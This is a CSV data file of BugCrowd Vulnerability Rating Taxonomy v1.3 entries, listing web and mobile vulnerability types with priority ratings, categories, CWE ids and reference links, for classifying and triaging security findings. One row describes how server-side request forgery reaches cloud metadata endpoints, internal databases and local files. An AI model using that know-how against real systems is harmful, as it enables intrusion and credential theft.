BCVRT-083,BCVRT,EXIF Geolocation Data Not Stripped From Uploaded Images: Automatic User Enumeration (P3),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; EXIF Geolocation Data Not Stripped From Uploaded Images: Automatic User Enumeration,EXIF Geolocation Data Not Stripped From Uploaded Images: Automatic User Enumeration (P3),,2,,,,83,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-084,BCVRT,EXIF Geolocation Data Not Stripped From Uploaded Images: Manual User Enumeration (P4),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; EXIF Geolocation Data Not Stripped From Uploaded Images: Manual User Enumeration,EXIF Geolocation Data Not Stripped From Uploaded Images: Manual User Enumeration (P4),,3,,,,84,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-076,BCVRT,Failure to Invalidate Session: All Sessions (P5),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Failure to Invalidate Session: All Sessions,Failure to Invalidate Session: All Sessions (P5),,3,,,,76,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-079,BCVRT,Concurrent Logins (P5),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Concurrent Logins,Concurrent Logins (P5),,3,,,,79,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-1018,,,
BCVRT-087,BCVRT,Visible Detailed Error/Debug Page: Descriptive Stack Trace (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Visible Detailed Error/Debug Page: Descriptive Stack Trace,Visible Detailed Error/Debug Page: Descriptive Stack Trace (P5),,3,,,,87,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-088,BCVRT,Disclosure of Known Public Information (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Disclosure of Known Public Information,Disclosure of Known Public Information (P5),,3,,,,88,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-200,,,
BCVRT-078,BCVRT,Failure to Invalidate Session: Long Timeout (P5),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Failure to Invalidate Session: Long Timeout,Failure to Invalidate Session: Long Timeout (P5),,3,,,,78,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-085,BCVRT,Visible Detailed Error/Debug Page: Detailed Server Configuration (P4),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Visible Detailed Error/Debug Page: Detailed Server Configuration,Visible Detailed Error/Debug Page: Detailed Server Configuration (P4),,3,,,,85,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-086,BCVRT,Visible Detailed Error/Debug Page: Full Path Disclosure (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Visible Detailed Error/Debug Page: Full Path Disclosure,Visible Detailed Error/Debug Page: Full Path Disclosure (P5),,3,,,,86,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-089,BCVRT,Token Leakage via Referer: Trusted 3rd Party (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Token Leakage via Referer: Trusted 3rd Party,Token Leakage via Referer: Trusted 3rd Party (P5),,3,,,,89,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-090,BCVRT,Token Leakage via Referer: Untrusted 3rd Party (P4),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Token Leakage via Referer: Untrusted 3rd Party,Token Leakage via Referer: Untrusted 3rd Party (P4),,3,,,,90,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-091,BCVRT,Token Leakage via Referer: Over HTTP (P4),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Token Leakage via Referer: Over HTTP,Token Leakage via Referer: Over HTTP (P4),,3,,,,91,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-311,,,
BCVRT-093,BCVRT,Non-Sensitive Token in URL (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Non-Sensitive Token in URL,Non-Sensitive Token in URL (P5),,3,,,,93,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-200,,,
BCVRT-094,BCVRT,Weak Password Reset Implementation: Password Reset Token Sent Over HTTP (P4),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Weak Password Reset Implementation: Password Reset Token Sent Over HTTP,Weak Password Reset Implementation: Password Reset Token Sent Over HTTP (P4),,3,,,,94,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-092,BCVRT,Sensitive Token in URL (P4),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Sensitive Token in URL,Sensitive Token in URL (P4),,3,,,,92,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-200,,,
BCVRT-095,BCVRT,Mixed Content (HTTPS Sourcing HTTP) (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Mixed Content (HTTPS Sourcing HTTP),Mixed Content (HTTPS Sourcing HTTP) (P5),,3,,,,95,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-098,BCVRT,Internal IP Disclosure (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Internal IP Disclosure,Internal IP and system information disclosure (phpinfo),,2,,,,98,Weaknesses in this category are typically introduced during the configuration of the software.,,,https://www.tenable.com/plugins/nnm/4666,https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed,,200,,,
BCVRT-099,BCVRT,Cross Site Script Inclusion (XSSI),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Cross Site Script Inclusion (XSSI),Cross Site Script Inclusion (XSSI),,2,,,,99,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-100,BCVRT,JSON Hijacking (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; JSON Hijacking,JSON Hijacking (P5),,3,,,,100,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-101,BCVRT,Stored: Non-Admin to Anyone (P2),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Stored: Non-Admin to Anyone,Stored: Non-Admin to Anyone (P2),,2,,,,101,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-102,BCVRT,Stored: Admin to Anyone (P3),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Stored: Admin to Anyone,Stored: Admin to Anyone (P3),,2,,,,102,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-103,BCVRT,Stored: Self (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Stored: Self,Stored: Self (P5),,3,,,,103,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-096,BCVRT,Sensitive Data Hardcoded: OAuth Secret (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Sensitive Data Hardcoded: OAuth Secret,Sensitive Data Hardcoded: OAuth Secret (P5),,3,,,,96,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-097,BCVRT,Sensitive Data Hardcoded: File Paths (P5),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Sensitive Data Hardcoded: File Paths,Sensitive Data Hardcoded: File Paths (P5),,3,,,,97,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-107,BCVRT,IE-Only: Older Version (IE 10/11) (P4),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); IE-Only: Older Version (IE 10/11),IE-Only: Older Version (IE 10/11) (P4),,3,,,,107,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-108,BCVRT,IE-Only: XSS Filter Disabled (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); IE-Only: XSS Filter Disabled,IE-Only: XSS Filter Disabled (P5),,3,,,,108,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-109,BCVRT,IE-Only: Older Version (< IE10) (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); IE-Only: Older Version (< IE10),IE-Only: Older Version (< IE10) (P5),,3,,,,109,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-110,BCVRT,Referer (P4),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Referer,Referer (P4),,3,,,,110,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-111,BCVRT,TRACE Method (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); TRACE Method,TRACE method is enabled,,1,,,,111,,"PHASE:Implementation
DESCRIPTION:Do not leave debug statements that could be executed in the source code. Assure that all debug information is eradicated before releasing the software.

PHASE:Architecture and Design
STRATEGY:Separation of Privilege
DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.",,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,215,,,
BCVRT-112,BCVRT,Universal (UXSS) (P4),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Universal (UXSS),Universal (UXSS) (P4),,3,,,,112,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-113,BCVRT,Off-Domain: Data URI (P4),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Off-Domain: Data URI,Off-Domain: Data URI (P4),,3,,,,113,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-114,BCVRT,Insecure Direct Object References (IDOR),BugCrowd Vuln Rating Taxonomy v1.3,Broken Access Control (BAC); Insecure Direct Object References (IDOR),Insecure Direct Object References (IDOR),,2,,,,114,,,,https://github.com/jhaddix/tbhm/blob/master/09_Privledge_Logic_Transport.md#Insecure-direct-objet-references,https://github.com/bugcrowd/vulnerability-rating-taxonomy,https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_(OTG-AUTHZ-004),CWE-932,,,
BCVRT-104,BCVRT,Reflected: Non-Self (P3),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Reflected: Non-Self,Reflected: Non-Self (P3),,2,,,,104,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-105,BCVRT,Reflected: Self (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Reflected: Self,Reflected: Self (P5),,3,,,,105,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-106,BCVRT,Cookie-Based (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Scripting (XSS); Cookie-Based,Cookie-Based (P5),,3,,,,106,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-115,BCVRT,Server-Side Request Forgery (SSRF): Internal (P2),BugCrowd Vuln Rating Taxonomy v1.3,Broken Access Control (BAC); Server-Side Request Forgery (SSRF): Internal,Server-Side Request Forgery (SSRF): Internal (P2),,2,"Overview
In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or a modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed.

Description
The target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (path traversal etc.).

When the manipulated request goes to the server, the server-side code picks up the manipulated URL and tries to read data to the manipulated URL. By selecting target URLs the attacker may be able to read data from services that are not directly exposed on the internet:

Cloud server meta-data - Cloud services such as AWS provide a REST interface on http://169.254.169.254/ where important configuration and sometimes even authentication keys can be extracted
Database HTTP interfaces - NoSQL database such as MongoDB provide REST interfaces on HTTP ports. If the database is expected to only be available to internally, authentication may be disabled and the attacker can extract data
Internal REST interfaces
Files - The attacker may be able to read files using file:// URIs
The attacker may also use this functionality to import untrusted data into code that expects to only read data from trusted sources, and as such circumvent input validation.",,,115,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-116,BCVRT,Server-Side Request Forgery (SSRF): External (P4),BugCrowd Vuln Rating Taxonomy v1.3,Broken Access Control (BAC); Server-Side Request Forgery (SSRF): External,Server-Side Request Forgery (SSRF): External (P4),,3,,,,116,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-117,BCVRT,Username Enumeration: Data Leak (P4),BugCrowd Vuln Rating Taxonomy v1.3,Broken Access Control (BAC); Username Enumeration: Data Leak,Username Enumeration: Data Leak (P4),,3,,,,117,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-118,BCVRT,Exposed Sensitive Android Intent,BugCrowd Vuln Rating Taxonomy v1.3,Broken Access Control (BAC); Exposed Sensitive Android Intent,Exposed Sensitive Android Intent,,2,,,,118,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-927,,,
BCVRT-119,BCVRT,Exposed Sensitive iOS URL Scheme,BugCrowd Vuln Rating Taxonomy v1.3,Broken Access Control (BAC); Exposed Sensitive iOS URL Scheme,Exposed Sensitive iOS URL Scheme,,2,,,,119,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-939,,,
BCVRT-120,BCVRT,Application-Wide (P2),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Request Forgery (CSRF); Application-Wide,Application-Wide (P2),,2,,,,120,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-121,BCVRT,Action-Specific: Authenticated Action,BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Request Forgery (CSRF); Action-Specific: Authenticated Action,Action-Specific: Authenticated Action,,2,,,,121,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-122,BCVRT,Action-Specific: Unauthenticated Action,BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Request Forgery (CSRF); Action-Specific: Unauthenticated Action,Action-Specific: Unauthenticated Action,,2,,,,122,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-123,BCVRT,Action-Specific: Logout (P5),BugCrowd Vuln Rating Taxonomy v1.3,Cross-Site Request Forgery (CSRF); Action-Specific: Logout,Action-Specific: Logout (P5),,3,,,,123,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-124,BCVRT,Critical Impact and/or Easy Difficulty (P2),BugCrowd Vuln Rating Taxonomy v1.3,Application-Level Denial-of-Service (DoS); Critical Impact and/or Easy Difficulty,Critical Impact and/or Easy Difficulty (P2),,2,,,,124,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-125,BCVRT,High Impact and/or Medium Difficulty (P3),BugCrowd Vuln Rating Taxonomy v1.3,Application-Level Denial-of-Service (DoS); High Impact and/or Medium Difficulty,High Impact and/or Medium Difficulty (P3),,2,,,,125,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-126,BCVRT,App Crash: Malformed Android Intents (P5),BugCrowd Vuln Rating Taxonomy v1.3,Application-Level Denial-of-Service (DoS); App Crash: Malformed Android Intents,App Crash: Malformed Android Intents (P5),,3,,,,126,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-127,BCVRT,App Crash: Malformed iOS URL Schemes (P5),BugCrowd Vuln Rating Taxonomy v1.3,Application-Level Denial-of-Service (DoS); App Crash: Malformed iOS URL Schemes,App Crash: Malformed iOS URL Schemes (P5),,3,,,,127,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-128,BCVRT,Open Redirect: GET-Based (P4),BugCrowd Vuln Rating Taxonomy v1.3,Unvalidated Redirects and Forwards; Open Redirect: GET-Based,Open Redirect: GET-Based (P4),,3,,,,128,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-129,BCVRT,Open Redirect: POST-Based (P5),BugCrowd Vuln Rating Taxonomy v1.3,Unvalidated Redirects and Forwards; Open Redirect: POST-Based,Open Redirect: POST-Based (P5),,3,,,,129,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-130,BCVRT,Open Redirect: Header-Based (P5),BugCrowd Vuln Rating Taxonomy v1.3,Unvalidated Redirects and Forwards; Open Redirect: Header-Based,Open Redirect: Header-Based (P5),,3,,,,130,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-131,BCVRT,Tabnabbing (P5),BugCrowd Vuln Rating Taxonomy v1.3,Unvalidated Redirects and Forwards; Tabnabbing,Tabnabbing (P5),,3,,,,131,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-1022,,,
BCVRT-132,BCVRT,Lack of Security Speed Bump Page (P5),BugCrowd Vuln Rating Taxonomy v1.3,Unvalidated Redirects and Forwards; Lack of Security Speed Bump Page,Lack of Security Speed Bump Page (P5),,3,,,,132,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-133,BCVRT,Browser Feature: Plaintext Password Field (P5),BugCrowd Vuln Rating Taxonomy v1.3,External Behavior; Browser Feature: Plaintext Password Field,Browser Feature: Plaintext Password Field (P5),,3,,,,133,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-134,BCVRT,Browser Feature: Save Password (P5),BugCrowd Vuln Rating Taxonomy v1.3,External Behavior; Browser Feature: Save Password,Browser Feature: Save Password (P5),,3,,,,134,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-135,BCVRT,Browser Feature: Autocomplete Enabled (P5),BugCrowd Vuln Rating Taxonomy v1.3,External Behavior; Browser Feature: Autocomplete Enabled,Browser Feature: Autocomplete Enabled (P5),,3,,,,135,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-136,BCVRT,Browser Feature: Autocorrect Enabled (P5),BugCrowd Vuln Rating Taxonomy v1.3,External Behavior; Browser Feature: Autocorrect Enabled,Browser Feature: Autocorrect Enabled (P5),,3,,,,136,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-137,BCVRT,Browser Feature: Aggressive Offline Caching (P5),BugCrowd Vuln Rating Taxonomy v1.3,External Behavior; Browser Feature: Aggressive Offline Caching,Browser Feature: Aggressive Offline Caching (P5),,3,,,,137,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-138,BCVRT,CSV Injection (P5),BugCrowd Vuln Rating Taxonomy v1.3,External Behavior; CSV Injection,CSV Injection (P5),,3,,,,138,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-139,BCVRT,Captcha Bypass: Crowdsourcing (P5),BugCrowd Vuln Rating Taxonomy v1.3,External Behavior; Captcha Bypass: Crowdsourcing,Captcha Bypass: Crowdsourcing (P5),,3,,,,139,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-140,BCVRT,System Clipboard Leak: Shared Links (P5),BugCrowd Vuln Rating Taxonomy v1.3,External Behavior; System Clipboard Leak: Shared Links,System Clipboard Leak: Shared Links (P5),,3,,,,140,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-141,BCVRT,User Password Persisted in Memory (P5),BugCrowd Vuln Rating Taxonomy v1.3,External Behavior; User Password Persisted in Memory,User Password Persisted in Memory (P5),,3,,,,141,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-142,BCVRT,Weak Password Policy (P5),BugCrowd Vuln Rating Taxonomy v1.3,Insufficient Security Configurability; Weak Password Policy,Weak Password Policy (P5),,3,,,,142,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-521,,,
BCVRT-143,BCVRT,No Password Policy (P4),BugCrowd Vuln Rating Taxonomy v1.3,Insufficient Security Configurability; No Password Policy,No Password Policy (P4),,3,,,,143,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-521,,,
BCVRT-144,BCVRT,Weak Password Reset Implementation: Token is Not Invalidated After Use (P4),BugCrowd Vuln Rating Taxonomy v1.3,Insufficient Security Configurability; Weak Password Reset Implementation: Token is Not Invalidated After Use,Weak Password Reset Implementation: Token is Not Invalidated After Use (P4),,3,,,,144,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-145,BCVRT,Weak Password Reset Implementation: Token is Not Invalidated After Email Change (P5),BugCrowd Vuln Rating Taxonomy v1.3,Insufficient Security Configurability; Weak Password Reset Implementation: Token is Not Invalidated After Email Change,Weak Password Reset Implementation: Token is Not Invalidated After Email Change (P5),,3,,,,145,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-146,BCVRT,Weak Password Reset Implementation: Token is Not Invalidated After Password Change (P5),BugCrowd Vuln Rating Taxonomy v1.3,Insufficient Security Configurability; Weak Password Reset Implementation: Token is Not Invalidated After Password Change,Weak Password Reset Implementation: Token is Not Invalidated After Password Change (P5),,3,,,,146,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-148,BCVRT,Weak Password Reset Implementation: Token is Not Invalidated After New Token is Requested (P5),BugCrowd Vuln Rating Taxonomy v1.3,Insufficient Security Configurability; Weak Password Reset Implementation: Token is Not Invalidated After New Token is Requested,Weak Password Reset Implementation: Token is Not Invalidated After New Token is Requested (P5),,3,,,,148,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-147,BCVRT,Weak Password Reset Implementation: Token Has Long Timed Expiry (P5),BugCrowd Vuln Rating Taxonomy v1.3,Insufficient Security Configurability; Weak Password Reset Implementation: Token Has Long Timed Expiry,Weak Password Reset Implementation: Token Has Long Timed Expiry (P5),,3,,,,147,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-149,BCVRT,Lack of Verification Email (P5),BugCrowd Vuln Rating Taxonomy v1.3,Insufficient Security Configurability; Lack of Verification Email,Lack of Verification Email (P5),,3,,,,149,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-150,BCVRT,Lack of Notification Email (P5),BugCrowd Vuln Rating Taxonomy v1.3,Insufficient Security Configurability; Lack of Notification Email,Lack of Notification Email (P5),,3,,,,150,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-152,BCVRT,Weak 2FA Implementation: Missing Failsafe (P5),BugCrowd Vuln Rating Taxonomy v1.3,Insufficient Security Configurability; Weak 2FA Implementation: Missing Failsafe,Weak 2FA Implementation: Missing Failsafe (P5),,3,,,,152,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-151,BCVRT,Weak Registration Implementation: Allows Disposable Email Addresses (P5),BugCrowd Vuln Rating Taxonomy v1.3,Insufficient Security Configurability; Weak Registration Implementation: Allows Disposable Email Addresses,Weak Registration Implementation: Allows Disposable Email Addresses (P5),,3,,,,151,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-153,BCVRT,Rosetta Flash (P4),BugCrowd Vuln Rating Taxonomy v1.3,Using Components with Known Vulnerabilities; Rosetta Flash,Rosetta Flash (P4),,3,,,,153,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-155,BCVRT,Captcha Bypass: OCR (Optical Character Recognition) (P5),BugCrowd Vuln Rating Taxonomy v1.3,Using Components with Known Vulnerabilities; Captcha Bypass: OCR (Optical Character Recognition),Captcha Bypass: OCR (Optical Character Recognition) (P5),,3,,,,155,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-154,BCVRT,Outdated Software Version (P5),BugCrowd Vuln Rating Taxonomy v1.3,Using Components with Known Vulnerabilities; Outdated Software Version,Outdated Software Version (P5),,3,,,,154,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-159,BCVRT,Non-Sensitive Application Data Stored Unencrypted (P5),BugCrowd Vuln Rating Taxonomy v1.3,Insecure Data Storage; Non-Sensitive Application Data Stored Unencrypted,Non-Sensitive Application Data Stored Unencrypted (P5),,3,,,,159,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-312,,,
BCVRT-160,BCVRT,Screen Caching Enabled (P5),BugCrowd Vuln Rating Taxonomy v1.3,Insecure Data Storage; Screen Caching Enabled,Screen Caching Enabled (P5),,3,,,,160,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-157,BCVRT,Sensitive Application Data Stored Unencrypted: On Internal Storage (P5),BugCrowd Vuln Rating Taxonomy v1.3,Insecure Data Storage; Sensitive Application Data Stored Unencrypted: On Internal Storage,Sensitive Application Data Stored Unencrypted: On Internal Storage (P5),,3,,,,157,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
